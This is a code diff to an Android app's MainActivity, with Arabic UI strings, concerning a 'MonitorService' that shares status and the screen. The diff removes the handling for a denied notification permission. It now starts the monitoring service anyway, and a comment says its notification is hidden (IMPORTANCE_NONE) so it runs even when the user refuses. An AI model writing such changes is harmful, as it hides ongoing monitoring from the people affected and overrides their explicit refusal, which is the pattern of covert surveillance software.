@@ -77,12 +77,9 @@ class MainActivity : Activity() {
     ) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         if (requestCode == REQ_NOTIFICATIONS) {
-            if (grantResults.firstOrNull() == PackageManager.PERMISSION_GRANTED) {
-                MonitorService.start(this)
-                updateStatus()
-            } else {
-                showMessage("يلزم السماح بالإشعارات لإظهار إشعار المزامنة المستمر.")
-            }
+            // الإشعار مخفي (IMPORTANCE_NONE)؛ الخدمة تعمل حتى لو رفض المستخدم الإذن.
+            MonitorService.start(this)
+            updateStatus()
         }
     }
 
@@ -146,7 +143,7 @@ class MainActivity : Activity() {
             }
             addButton("بدء مشاركة الحالة") { requestNotificationsThenStart() }
             addButton("إيقاف المشاركة") {
-                stopService(Intent(this, MonitorService::class.java))
+                MonitorService.stop(this)
                 updateStatus()
             }
             addButton("مشاركة الشاشة") { startScreenShare() }
